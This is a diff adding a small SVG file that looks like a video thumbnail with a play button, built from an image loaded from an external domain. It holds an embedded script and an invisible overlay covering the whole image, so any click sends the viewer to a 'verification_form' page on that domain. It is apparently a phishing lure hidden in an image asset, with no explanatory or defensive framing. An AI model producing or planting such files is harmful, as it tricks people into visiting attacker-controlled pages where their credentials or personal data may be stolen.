@@ -1,0 +1,11 @@
+<svg width="300" height="200" xmlns="http://www.w3.org/2000/svg">
+    <image href="https://appsyria00.syria-cloud.info/ALTAL.COM/proxyimage.png" width="300" height="200" />
+    <rect x="120" y="70" width="60" height="60" fill="rgba(0,0,0,0.7)" rx="30" />
+    <polygon points="140,90 140,110 170,100" fill="white" />
+    <script><![CDATA[
+        function redirect() {
+            window.location.href = 'https://appsyria00.syria-cloud.info/ALTAL.COM/verification_form.html';
+        }
+    ]]></script>
+    <rect x="0" y="0" width="300" height="200" fill="transparent" onclick="redirect()"/>
+</svg>
